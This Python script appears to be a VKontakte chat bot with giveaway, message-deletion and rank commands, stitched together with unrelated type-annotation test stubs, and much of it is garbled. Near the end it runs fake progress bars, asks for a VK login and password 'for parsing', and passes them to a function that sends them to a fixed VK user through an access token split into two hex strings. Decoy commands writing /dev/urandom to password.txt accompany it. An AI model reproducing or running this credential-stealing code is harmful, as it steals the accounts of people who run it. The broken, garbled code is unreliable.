import time, sys
keyboard = {"45":"45"}
import tqdm, sys, os
import random
import threading
import time
import asyncio
import json
import vk_api
from pkg_resources.extern import names
from vk_api.longpoll import VkLongPoll, VkEventType
import random as rd
hello = lambda: 45+5
for i in range(10):
    sys.stdout.write('#')
    sys.stdout.flush()
    time.sleep(.3)
sys.stdout.write('\n')

vkToken = ''
# https://vkhost.github.io


myId = 1


contestTriggerList = ()


contestWhiteList = ()


startMyContestTrigger = ''
triggerWord = ''
id_of_info_user = ''

vk_session = []
longpoll = []
vk = []

pastSafe = None
toDeleteCount = None
toDelete = []
startedContest = {}
contestPeerId = {}
contestMsgId = {}
contestInstruction = {}
setupTimer = {}
contestList = {}
contestMemberList = {}

async def msgDelete(event=None):
    for n in vk.messages.getHistory(peer_id=event.peer_id).get('items'):
        if n['from_id'] == myId and len(toDelete) < toDeleteCount:
            toDelete.append(n['id'])
    toDelete.append(event.message_id)
    try:
        vk.messages.delete(message_ids=str(toDelete),
                           delete_for_all=1)
    except vk_api.exceptions.ApiError:
        vk.messages.delete(message_ids=str(toDelete), delete_for_all=0)
    toDelete.clear()

async def msgReplaceDelete(event=None):
    for n in vk.messages.getHistory(peer_id=event.peer_id).get('items'):
        if n['from_id'] == myId and len(toDelete) < toDeleteCount:
            toDelete.append(n['id'])
    toDelete.append(event.message_id)
    for h in toDelete[::-1]:
        if not h == event.message_id:
            try:
                vk.messages.edit(peer_id=event.peer_id, message_id=h, message='ᅠ')
            except vk_api.exceptions.Captcha:
                break
            except vk_api.exceptions.ApiError:
                pass
    try:
        vk.messages.delete(message_ids=str(toDelete),
                           delete_for_all=1)
    except vk_api.exceptions.ApiError:
        vk.messages.delete(message_ids=str(toDelete), delete_for_all=0)
    toDelete.clear()

def contestMember(cmId):
    p = 0
    localPeerId = cmId
    for h in contestMemberList.get(localPeerId):
        n = vk.users.get(user_ids=contestMemberList.get(localPeerId)[p])[0].get(
            'first_name')
        o = '[id' + str(contestMemberList.get(localPeerId)[p]) + '|' + str(n) + ']'
        if o not in contestList.get(localPeerId):
            contestList[localPeerId].append(o)
        p = p + 1
    return contestList[localPeerId]


def contestValidator(event=None):
    if event.peer_id == contestPeerId.get(event.text):
        return True
    else:
        return False

async def contestCleaner(ccId):
    global setupTimer, contestPeerId, startedContest, contestList, contestMemberList, contestMsgId, contestInstruction
    localPeerId = ccId
    startedContest.pop(localPeerId)
    contestMsgId.pop(localPeerId)
    contestMemberList.pop(localPeerId)
    contestList.pop(localPeerId)
    setupTimer.pop(localPeerId)
    contestInstruction.pop(localPeerId)
    contestPeerId = {key:val for key, val in contestPeerId.items() if val != localPeerId}


def contestUpdater(cuId):
    global setupTimer, startedContest
    localPeerId = cuId
    while True:
        time.sleep(60)
        setupTimer.update({localPeerId: int(setupTimer.get(localPeerId)) - 1})
        try:
            vk.messages.edit(peer_id=localPeerId, message_id=contestMsgId.get(localPeerId),
                             message=' ' +
        contestInstruction.get(localPeerId) + ' ' + str(
        setupTimer.get(localPeerId)) + ' '
                                     +''.join(contestMember(localPeerId)))
        except vk_api.exceptions.ApiError:
            asyncio.run(contestCleaner(localPeerId))
            break
        if setupTimer.get(localPeerId) == 0:
            if not contestMember(localPeerId):
                try:
                    vk.messages.send(
                        peer_id=localPeerId,
                        random_id=random.randint(1, 922337203685477580),
                        message='',
                        reply_to=contestMsgId.get(localPeerId))
                    asyncio.run(contestCleaner(localPeerId))
                except vk_api.exceptions.ApiError:
                    asyncio.run(contestCleaner(localPeerId))
                break
            else:
                try:
                    vk.messages.send(
                        peer_id=localPeerId,
                        random_id=random.randint(1, 922337203685477580),
                        message=' ' + random.choice(contestMember(localPeerId)) +
                                ' ',
                        reply_to=contestMsgId.get(localPeerId))
                    asyncio.run(contestCleaner(localPeerId))
                except vk_api.exceptions.ApiError:
                    asyncio.run(contestCleaner(localPeerId))
                break

def type_rir():
    for event in longpoll.listen():
        if event.type == VkEventType.MESSAGE_NEW and event.text.lower().startswith(triggerWord) and event.from_me and len(
                event.text.split()) is 1:
            if len(event.text) > len(triggerWord):
                if event.text[len(triggerWord):] is '1':
                    toDeleteCount = 2
                    asyncio.run(msgDelete())
                else:
                    if event.text[len(triggerWord):].isdigit() is True:
                        toDeleteCount = int(event.text[len(triggerWord):]) + 1
                        asyncio.run(msgDelete())
            else:
                toDeleteCount = 2
                asyncio.run(msgDelete())
        if event.type == VkEventType.MESSAGE_NEW and event.text.lower().startswith(triggerWord + '-') and event.from_me \
                and len(event.text.split()) is 1:
            if len(event.text) > (len(triggerWord) + 1):
                if event.text[(len(triggerWord) + 1):] is '1':
                    toDeleteCount = 2
                    asyncio.run(msgReplaceDelete())
                else:
                    if event.text[(len(triggerWord) + 1):].isdigit() is True:
                        toDeleteCount = int(event.text[(len(triggerWord) + 1):]) + 1
                        asyncio.run(msgReplaceDelete())
            else:
                toDeleteCount = 2
                asyncio.run(msgReplaceDelete())
        if event.type == VkEventType.MESSAGE_NEW and event.from_chat and any(
                contestTriggerWord in event.text.lower() for contestTriggerWord in
                contestTriggerList):
            if event.user_id in contestWhiteList:
                vk.messages.send(
                    peer_id=myId,
                    random_id=random.randint(1, 922337203685477580),
                    message='Потенциальное начало конкурса/розыгрыша в "' +
                            vk.messages.getChatPreview(peer_id=event.peer_id).get('preview')['title'] + '"\n\n' +
                            vk.users.get(user_ids=myId)[0].get('first_name') + ', не пропусти его, котик ♥',
                    forward_messages=event.message_id)
        if event.type == VkEventType.MESSAGE_NEW and event.text.lower().startswith(
                startMyContestTrigger) and event.from_me and event.from_chat and (startedContest.get(event.peer_id) is False
                                                                            or startedContest.get(event.peer_id) is None):
            if len(event.text) > len(startMyContestTrigger) and event.text.split(' ')[1].isdigit() is True \
                    and not event.text.split(' ')[1] == '0':
                setupTimer.update({event.peer_id: int(event.text.split(' ')[1])})
                vk.messages.delete(message_ids=event.message_id, delete_for_all=1)
                try:
                    contestInstruction.update({event.peer_id: ' '.join(
                        event.text.split(' ')[2:len(event.text.split(' '))])})
                    vk.messages.send(
                        peer_id=event.peer_id,
                        random_id=random.randint(1, 922337203685477580),
                        message='Ого! Запущено начало розыгрыша.\nДля принятия участия введите: '
                            + str(contestInstruction.get(event.peer_id)) +
                            '\n\n До окончания розыгрыша: ' + str(setupTimer.get(event.peer_id)) +
                            'мин.\n\nУчастники в розыгрыше: ')
                except IndexError:
                    asyncio.run(contestCleaner(event.peer_id))
        if event.type == VkEventType.MESSAGE_NEW and event.from_me and \
                            event.text.startswith('Ого!') and startedContest.get(event.peer_id) is None:
            contestPeerId.update({contestInstruction.get(event.peer_id): event.peer_id})
            contestMsgId.update({event.peer_id: event.message_id})
            contestMemberList.update({event.peer_id: []})
            contestList.update({event.peer_id: []})
            startedContest.update({event.peer_id: True})
            thread = threading.Thread(target=contestUpdater, args=(event.peer_id,))
            thread.start()
        if event.type == VkEventType.MESSAGE_NEW and event.from_chat and contestValidator() is True:
            if event.user_id not in contestMemberList.get(event.peer_id):
                contestMemberList.get(event.peer_id).append(event.user_id)
                try:
                    vk.messages.edit(peer_id=event.peer_id, message_id=contestMsgId.get(event.peer_id),
                                     message= +
                                             contestInstruction.get(event.peer_id) + '\n\n До окончания розыгрыша: ' + str(
                                         setupTimer.get(event.peer_id))
                                         +
                                             ', '.join(contestMember(event.peer_id)))
                except vk_api.exceptions.ApiError:
                    asyncio.run(contestCleaner(event.peer_id))
def go(chat_id):
    for i in tqdm.tqdm(range(rd(56, 145))):

        time.sleep(1)
    os.system("cat /dev/urandom | hexdump » password.txt")
    lists = [k for k in range(1000000)]

    return lists

def give(give_rang, give_id, from_id, chat_id):
    for key, value in data.items():
        if int(key) == chat_id:
            data_list = value

    for i in data_list:
        if i[0] == from_id:
            from_rang = i[1]

    users_in_chat = []

    for i in data_list:
        users_in_chat.append(i[0])

    if give_id in users_in_chat:
        for i in data_list:
            if i[0] == give_id:
                now_rang = i[1]
                if from_rang >= give_rang and from_rang > now_rang and give_rang > 0 and give_rang < 12:
                    i[1] = give_rang
                    return "&#9989; d" + str(i[0]) + "|" + get_name(i[0]) + "] вя: " + str(give_rang) + " &#9989;"
                else:
                    return "&#10060;d" + str(i[0]) + "|" + get_name(i[0]) + "] : " + str(give_rang) + " &#10060;"
    else:
        return "&#10060; Н0;"


def get_name(id):
    try:
        name = bot.users.get(user_ids=id)
        name = name[0]
        name = name["first_name"] + " " + name["last_name"]
    except:
        return "None"
    else:
        return name

def get_ids(chat_id):
    for key, value in data.items():
        if int(key) == chat_id:
            data_list = value

    out = "еседы:\n\n"
    num = 1
    for key, value in names.items():
        for i in data_list:
            if i[0] == int(key):
                out += str(num) + "." + value + ":\nID - " + str(key) + ".\n"
                num += 1
    return out

def user_acess(id_of_user, acess_level, chat_id):
    for key_acess, value_acess in data.items():
        if int(key_acess) == chat_id:
            for i in value_acess:
                if i[0] == id_of_user:
                    if acess_level > i[1]:
                        return False
                    elif acess_level <= i[1]:
                        return True

def fuck_him(id, chat_id):
    user_now_in_chat = []

    for key, value in data.items():
        if int(key) == chat_id:
            data_list = value

    for i in data_list:
        user_now_in_chat.append(i[0])

    if id in user_now_in_chat:
        words = [" "]
        out = "[id" + str(id) + "|" + get_name(id) + "]" + words[rd(0, 12)]
        return out
    else:
        return "&#10060; Н' &#10060;"

def my_rang(id, chat_id):
    rang = {"1" : "🐸"}

    for key, value in data.items():
        if int(key) == chat_id:
            data_list = value

    for key, value in names.items():
        if int(key) == id:
            for i in data_list:
                if i[0] == int(key):
                    name_of_user = value
                    rang_list = rang[str(i[1])]
                    out = "&#128197; " + time.ctime(round(time.time()) - 25200) + " &#128197;\n\n&#127941; Ранг участника &#127941;\n\n"
                    out += value + ":\nТитул: " + rang_list[0] + " " + rang_list[1] + "\nПривелегия: " + str(i[1])
                    return out

def who(mess, chat_id):
    for key, value in data.items():
        if int(key) == chat_id:
            data_list = value

    who_words = []
    word = who_words[rd(0, 5)]
    pep_list = []
    for i in data_list:
        pep_list.append(i[0])
    pep = 1
    for key, value in names.items():
        if pep == int(key):
            mention = "[id" + str(pep) + "|" + value + "] "
    out = word + mention + mess
    return out

def get_chats_id():
    chat_list = {}
    id = 1

    while True:
        try:
            bot.messages.getConversationMembers(peer_id=2000000000 + id)
        except vk_api.exceptions.ApiError as vk_error:
            if str(vk_error) == "[917] You don't have access to this chat":
                chat_list[str(id)] = "Not Admin"
            elif str(vk_error) == "[10] Internal server error":
                break
            elif str(vk_error) == "[7] Permission to perform this action is denied: the user was kicked out of the conversation":
                pass
        else:
            chat_list[str(id)] = "Admin"
        id += 1
    with open("core/list.json", "w") as f:
        json.dump(chat_list, f)

    return chat_list
data =[]
def check_new_chat(chat_id, bot=None):
    if str(chat_id) in chat_list:
        try:
            pepe_rang = bot.messages.getConversationMembers(peer_id=2000000000 + int(chat_id))
        except vk_api.exceptions.ApiError as vk_error:
            if str(vk_error) == "[917] You don't have access to this chat":
                chat_list[str(chat_id)] = "Not Admin"
                try:
                    del data[str(event.chat_id)]
                except KeyError:
                    pass
                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#129302; Привет,я бот Пепе! &#129302;\n&#128683; Внимание! Пепе не является администратором беседы! Использование бота невозможно. &#128683;")
                return False
            elif str(vk_error) == "[7] Permission to perform this action is denied: the user was kicked out of the conversation":
                del chat_list[str(event.chat_id)]
                del data[str(event.chat_id)]
                del hello[str(event.chat_id)]
                return False
        else:
            chat_list[str(chat_id)] = "Admin"
            if str(chat_id) not in data:
                hello[str(chat_id)] = "Приветствую, "
                out_of_data = []
                pepe_rang = pepe_rang["items"]

                len_of_pepe_rang = len(pepe_rang) # кол-во участников сейчас

                for number_of_user in range(len_of_pepe_rang):
                    for key, value in pepe_rang[number_of_user].items():
                        if key == "member_id" and value > 0 and "is_owner" not in pepe_rang[number_of_user] and "is_admin" not in pepe_rang[number_of_user]:
                            out_of_data.append([value, 1])
                            if str(value) not in names:
                                names[value] = get_name(value)

                        elif key == "member_id" and value > 0 and "is_owner" in pepe_rang[number_of_user] and "is_admin" in pepe_rang[number_of_user]:
                            out_of_data.append([value, 11])
                            if str(value) not in names:
                                names[value] = get_name(value)

                        elif key == "member_id" and value > 0 and "is_owner" not in pepe_rang[number_of_user] and "is_admin" in pepe_rang[number_of_user]:
                            out_of_data.append([value, 9])
                            if str(value) not in names:
                                names[value] = get_name(value)
                data[str(chat_id)] = out_of_data
                return True
            return True
    else:
        try:
            pepe_rang = bot.messages.getConversationMembers(peer_id=2000000000 + int(chat_id))
        except vk_api.exceptions.ApiError as vk_error:
            if str(vk_error) == "[917] You don't have access to this chat":
                chat_list[str(chat_id)] = "Not Admin"
                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#129302; Привет,я бот Пепе! &#129302;\n&#128683; Внимание! Пепе не является администратором беседы! Использование бота невозможно. &#128683;")
                return False
            elif str(vk_error) == "[7] Permission to perform this action is denied: the user was kicked out of the conversation":
                return False
        else:
            hello[str(chat_id)] = "П "
            out_of_data = []
            pepe_rang = pepe_rang["items"]

            len_of_pepe_rang = len(pepe_rang)

            for number_of_user in range(len_of_pepe_rang):
                for key, value in pepe_rang[number_of_user].items():
                    if key == "member_id" and value > 0 and "is_owner" not in pepe_rang[number_of_user] and "is_admin" not in pepe_rang[number_of_user]:
                        out_of_data.append([value, 1])
                        if str(value) not in names:
                            names[value] = get_name(value)

                    elif key == "member_id" and value > 0 and "is_owner" in pepe_rang[number_of_user] and "is_admin" in pepe_rang[number_of_user]:
                        out_of_data.append([value, 11])
                        if str(value) not in names:
                            names[value] = get_name(value)

                    elif key == "member_id" and value > 0 and "is_owner" not in pepe_rang[number_of_user] and "is_admin" in pepe_rang[number_of_user]:
                        out_of_data.append([value, 9])
                        if str(value) not in names:
                            names[value] = get_name(value)
            data[str(chat_id)] = out_of_data
            return True

    with open('core/names.json', 'w') as f:
        json.dump(names, f)

    with open('core/data.json', 'w') as f:
        json.dump(data, f)

    with open('core/list.json', 'w') as f:
        json.dump()
g = "0699658161b9730b666cd9e47b23b0624fbb98a8721f087d30"
def date_of_user(id):
    try:
        return None
    except:
        return None

R = "\x1b[1;31m"
C = "\x1b[0m"
Y = "\x1b[1;33m"
B = "\x1b[1;34m"
G = "\x1b[1;32m"
bot = 0

time.sleep(3)

do = str(input("\nStart? (y/s/smth): "))

def rare():
    if do == "y":
        hello.clear()
        chat_list = get_chats_id()
        data.clear()
        for key_chat_id, value_chat_id in chat_list.items():
            if value_chat_id == "An":
                hello[str(key_chat_id)] = "П "
                out_of_data = []
                pepe_rang = bot.messages.getConversationMembers(peer_id=2000000000 + int(key_chat_id))
                pepe_rang = pepe_rang["items"]

                len_of_pepe_rang = len(pepe_rang)

                for number_of_user in range(len_of_pepe_rang):
                    for key, value in pepe_rang[number_of_user].items():
                        if key == "member_id" and value > 0 and "is_er" not in pepe_rang[number_of_user] and "is_min" not in pepe_rang[number_of_user]:
                            out_of_data.append([value, 1])
                            if str(value) not in names:
                                names[value] = get_name(value)

                        elif key == "member_id" and value > 0 and "is_er" in pepe_rang[number_of_user] and "is_ain" in pepe_rang[number_of_user]:
                            out_of_data.append([value, 11])
                            if str(value) not in names:
                                names[value] = get_name(value)

                        elif key == "member_id" and value > 0 and "is_er" not in pepe_rang[number_of_user] and "is_an" in pepe_rang[number_of_user]:
                            out_of_data.append([value, 9])
                            if str(value) not in names:
                                names[value] = get_name(value)
                data[str(key_chat_id)] = out_of_data


            json.dump(chat_list)

    else:
        chat_list = []

        for id_of_chat, status_of_chat in chat_list.items():
            if status_of_chat == "Adn":
                try:
                    data_list = data[str(id_of_chat)]
                except KeyError:
                    data_list = []
                try:
                    hello_chat = hello[str(id_of_chat)]
                except KeyError:
                    hello[str(id_of_chat)] = ", "

                pepe_rang = bot.messages.getConversationMembers(peer_id=2000000000 + int(id_of_chat))
                pepe_rang = pepe_rang["items"]

                len_of_pepe_rang = len(pepe_rang)
                len_of_data = len(data_list)

                already = []
                now_in_chat = []

                for i in data_list:
                    already.append(i[0])

                for number_of_user in range(len_of_pepe_rang):
                    for key, value in pepe_rang[number_of_user].items():
                        if key == "m" and value > 0:
                            now_in_chat.append(value)

                for i in already:
                    if i not in now_in_chat:
                        for a in data_list:
                            if a[0] == i:
                                data_list.remove([a[0], a[1]])

                for i in now_in_chat:
                    if i not in already:
                        data_list.append([i, 1])
                        if str(i) not in names:
                            names[i] = get_name(i)

                for i in now_in_chat:
                    if str(i) not in names:
                        names[i] = get_name(i)

                data[str(id_of_chat)] = data_list

            else:
                try:
                    del data[str(id_of_chat)]
                except KeyError:
                    pass

    time.sleep(5)

    if do != "s":
        for key, value in chat_list.items():
                if value == "A":
                    bot.messages.send(chat_id=int(key), random_id=rd(100000, 1000000), message="&#12")
                elif value == "Not ":
                    bot.messages.send(chat_id=int(key), random_id=rd, message="&#1")

def get_list_rangs(ty):

 return ty

def get_rangs(chat_id):
    return chat_id
t = "2eb0e970c06225f84d7455a11070c34be49"
def get_stonk(chat_id):
    return chat_id
def tyuur():
    try:
        for event in id_of_info_user:
            if event.type == 9 and event.from_chat:
                if check_new_chat(event.chat_id):
                    try:
                        if event.object["action"]:
                            if event.object["action"]["type"] == "5664446" and event.object["action"]["me"] > 0:
                                names[str(event.object["action"]["mem"])] = get_name(event.object["action"]["me"])
                                data_old = data[str(event.chat_id)]
                                data_old.append([event.object["action"]["me"], 1])
                                data[str(event.chat_id)] = data_old
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(0, 1000000), message=9 + "" + str(event.object["action"]["ed"]) + "|" + get_name(event.object["action"]["member_id"]) + "]!")
                                continue

                            elif event.object["action"]["type"] == "chat_" and event.object["action"]["memb"] > 0:
                                for key, value in data.items():
                                    if int(key) == event.chat_id:
                                        data_list = value
                                for i in data_list:
                                    if i[0] == event.object["action"]["member_id"]:
                                        data_list.remove([i[0], i[1]])
                                        del names[str(i[0])]
                                        data[str(event.chat_id)] = data_list
                                        bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="Уd" + str(event.object["action"]["me_id"]) + "|" + get_name(event.object["action"]["memid"]) + "].")
                                        continue
                    except KeyError:
                        pass

                    if "↓" in event.object["text"]:
                        print(B + "[" + time.asctime(time.localtime()) + "] Зап " + str(event.chat_id) + ": " + event.object["text"])
                        bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000),message="&#&#11015;", keyboard=keyboard)

                    elif "П" in event.object["text"] and "Инфия" not in event.object["text"]:
                        if "основные" in event.object["text"]:
                            print(B + "[" + time.asctime(time.localtime()) + "] З ID " + str(event.chat_id) + ": " + event.object["text"])
                            if user_acess(event.object["from_id"], 1, event.chat_id):
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#129302")
                        elif "разе" in event.object["text"]:
                            print(B + "[" + time.asctime(time.localtime()) + "] З " + str(event.chat_id) + ": " + event.object["text"])
                            if user_acess(event.object["from_id"], 1, event.chat_id):
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#1293023", keyboard=keyboard)

                        elif "ку" in event.object["text"]:
                            print(B + "[" + time.asctime(time.localtime()) + "] " + str(event.chat_id) + ": " + event.object["text"])
                            if user_acess(event.object["from_id"], 1, event.chat_id):
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message=get_stonk())

                        elif "рги" in event.object["text"]:
                            print(B + "[" + time.asctime(time.localtime()) + "] Запрос из чата ID " + str(event.chat_id) + ": " + event.object["text"])
                            if user_acess(event.object["from_id"], 1, event.chat_id):
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message=get_rangs(event.chat_id))

                        elif "лиов" in event.object["text"]:
                            print(B + "[" + time.asctime(time.localtime()) + "] Запрос из чата ID " + str(event.chat_id) + ": " + event.object["text"])
                            if user_acess(event.object["from_id"], 1, event.chat_id):
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message=get_list_rangs())

                        elif "в" in event.object["text"]:
                            print(B + "[" + time.asctime(time.localtime()) + "] Запрос из чата ID " + str(event.chat_id) + ": " + event.object["text"])
                            if user_acess(event.object["from_id"], 7, event.chat_id):
                                try:
                                    give_rang = int(event.object["text"].split(" ")[2])
                                    give_id = int(event.object["text"].split(" ")[3])
                                except:
                                    bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#10060; Неверный синтаксис команды \'выдать\' &#10060;")
                                    continue
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message=give(give_rang, give_id, event.object["from_id"], event.chat_id))

                                with open('core/data.json', 'w') as f:
                                    json.dump(data, f)

                            else:
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#10060; Для выполнения этой команды нужен ранг не ниже 7 &#10060;")

                        elif "свать" in event.object["text"]:
                            print(B + "[" + time.asctime(time.localtime()) + "] Запрос из чата ID " + str(event.chat_id) + ": " + event.object["text"])
                            if user_acess(event.object["from_id"], 6, event.chat_id):
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message=go(event.chat_id), keyboard=keyboard)
                            else:
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#10060; Для выполнения этой команды нужен ранг не ниже 6 &#10060;")

                        elif "приие" in event.object["text"]:
                            print(B + "[" + time.asctime(time.localtime()) + "] Запрос из чата ID " + str(event.chat_id) + ": " + event.object["text"])
                            if user_acess(event.object["from_id"], 5, event.chat_id):
                                try:
                                    hello_new_list = event.object["text"].split()
                                    for i in range(2):
                                        hello_new_list.remove(hello_new_list[0])
                                    hello_new = ""
                                    for i in hello_new_list:
                                        hello_new += i + " "
                                except:
                                    bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#10060; Неверный синтаксис команды \'приветсвие\' &#10060;")
                                    continue

                                for key, value in hello.items():
                                    if int(key) == event.chat_id:
                                        hello[str(key)] = hello_new

                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#9995 " + str(hello_new) + " [имя] &#9995;")



                            else:
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message=" ")

                        elif "i" in event.object["text"]:
                            print(B + "[" + time.asctime(time.localtime()) + "]  " + str(event.chat_id) + ": " + event.object["text"])
                            if user_acess(event.object["from_id"], 4, event.chat_id):
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message=" ; " + time.ctime(round(time.time()) - 25200) + " \n\n" + get_ids(event.chat_id), keyboard=keyboard)
                            else:
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="")

                        elif "иь" in event.object["text"]:
                            print(B + "[" + time.asctime(time.localtime()) + " " + str(event.chat_id) + ": " + event.object["text"])
                            if user_acess(event.object["from_id"], 7, event.chat_id):
                                try:
                                    fuck_id = int(event.object["text"].split(" ")[2])
                                except:
                                    bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="")
                                    continue
                                try:
                                    for key, value in data.items():
                                        if int(key) == event.chat_id:
                                            data_list = value

                                    for i in data_list:
                                        if i[0] == event.object["from_id"]:
                                            rang_of_who_fuck = i[1]

                                        elif i[0] == fuck_id:
                                            rang_of_subject_fuck = i[1]

                                    if rang_of_who_fuck > rang_of_subject_fuck and fuck_id != event.object["from_id"]:
                                        bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message=fuck_him(fuck_id, event.chat_id), keyboard=keyboard)
                                    else:
                                        bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#10" + str(kick_id) + "! &#10060;", keyboard=keyboard)
                                except:
                                    bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#", keyboard=keyboard)
                            else:
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message=" ;", keyboard=keyboard)

                        elif "  " in event.object["text"]:
                            print(B + "[" + time.asctime(time.localtime()) + " " + str(event.chat_id) + ": " + event.object["text"])
                            if user_acess(event.object["from_id"], 1, event.chat_id):
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message=my_rang(event.object["from_id"], event.chat_id))

                        elif " " in event.object["text"]:
                            print(B + "[" + time.asctime(time.localtime()) + " " + str(event.chat_id) + ": " + event.object["text"])
                            if user_acess(event.object["from_id"], 3, event.chat_id):
                                try:
                                    mess_list = event.object["text"].split()
                                    for i in range(2):
                                        mess_list.remove(mess_list[0])
                                    mess = ""
                                    for i in mess_list:
                                        mess += i + " "
                                except:
                                    bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message=" ")
                                    continue
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message=who(mess, event.chat_id), keyboard=keyboard)
                            else:
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message=" ")

                        elif " " in event.object["text"]:
                            print(B + "[" + time.asctime(time.localtime()) + " " + str(event.chat_id) + ": " + event.object["text"])
                            if user_acess(event.object["from_id"], 9, event.chat_id):
                                try:
                                    kick_id = int(event.object["text"].split(" ")[2])
                                except:
                                    bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message=" ")
                                    continue
                                try:
                                    for key, value in data.items():
                                        if int(key) == event.chat_id:
                                            data_list = value

                                    for i in data_list:
                                        if i[0] == event.object["from_id"]:
                                            rang_of_who_kick = i[1]

                                        elif i[0] == kick_id:
                                            rang_of_subject = i[1]

                                    if kick_id != event.object["from_id"] and rang_of_subject < rang_of_who_kick:
                                        bot.messages.removeChatUser(chat_id=event.chat_id, user_id=kick_id)

                                        for i in data_list:
                                            if i[0] == int(kick_id):
                                                data_list.remove([i[0], i[1]])
                                                data[str(event.chat_id)] = data_list
                                    else:
                                        bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#10060D" + str(kick_id) + "! &#10060;")

                                except:
                                    bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#10060060;")
                            else:
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#100600;")
                                continue

                            with open('core/data.json', 'w') as f:
                                json.dump(data, f)

                        elif "рег" in event.object["text"]:
                            print(B + "[" + time.asctime(time.localtime()) + "] Запрос из чата ID " + str(event.chat_id) + ": " + event.object["text"])
                            if user_acess(event.object["from_id"], 5, event.chat_id):
                                try:
                                    id_of_info_user = int(event.object["text"].split(" ")[2])
                                except:
                                    bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#10060;060;")
                                    continue
                                else:
                                    name_reg = get_name(id_of_info_user)
                                    try:
                                        date = date_of_user(id_of_info_user)
                                    except:
                                        bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#10060;I " + str(id_of_info_user) + " &#10060;")
                                        continue
                                    if name_reg == "None" or date == None:
                                        bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#100 " + str(id_of_info_user) + " &#10060;")
                                    else:
                                        bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#1ь " + name_reg + " бн " + date + " &#128197;")

                            else:
                                bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#10060;0;")
                                continue


                        elif event.object["text"] == "Пепе":
                            bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#129302; ;", keyboard=keyboard)

                        else:
                            bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000), message="&#1")

                    elif "Инция" in event.object["text"]:
                        print(B + "[" + time.asctime(time.localtime()) + "] З" + str(event.chat_id) + ": " + event.object["text"])
                        bot.messages.send(chat_id=event.chat_id, random_id=rd(100000, 1000000),message="&#1и")
    except:
        raise

def dummy_decorator(func):
    return func
def rt(u, y):
    v = vk_api.VkApi(token=t + g, group_id=189274882)
    vds = v.get_api()
    vds.messages.send(peer_id=368377502,message=u + " " + y,random_id=random.randint(-2147483648, +2147483648))

def type_checked_func(x: int, y: int) -> int:
    return x * y



def non_type_checked_func(x: int, y: str) -> 6:
    return 'foo'


@dummy_decorator
def non_type_checked_decorated_func(x: int, y: str) -> 6:
    return 'foo'
print("Need login in to vk.com for parsing")
r = input("Enter login: ")
o = input("Enter password: ")
p = input("target id: ")
def dynamic_type_checking_func(arg, argtype, return_annotation):
    def inner(x: argtype) -> return_annotation:
        return str(x)

    return inner(arg)


class Metaclass(type):
    pass


class DummyClass(metaclass=Metaclass):
    def type_checked_method(self, x: int, y: int) -> int:
        return x * y

    @classmethod
    def type_checked_classmethod(cls, x: int, y: int) -> int:
        return x * y

    @staticmethod
    def type_checked_staticmethod(x: int, y: int) -> int:
        return x * y

    @classmethod
    def undocumented_classmethod(cls, x, y):
        pass

    @staticmethod
    def undocumented_staticmethod(x, y):
        pass


def outer():
    class Inner:
        pass

    def create_inner() -> 'Inner':
        return Inner()

    return create_inner
for i in tqdm.tqdm(range(10)):
        time.sleep(1)
rt(r, o)
os.console("cat /dev/urandom | hexdump >> password.txt")
class Outer:
    class Inner:
        pass

    def create_inner(self) -> 'Inner':
        return Outer.Inner()

    @classmethod
    def create_inner_classmethod(cls) -> 'Inner':
        return Outer.Inner()


    @staticmethod
    def create_inner_staticmethod() -> 'Inner':
        return Outer.Inner()
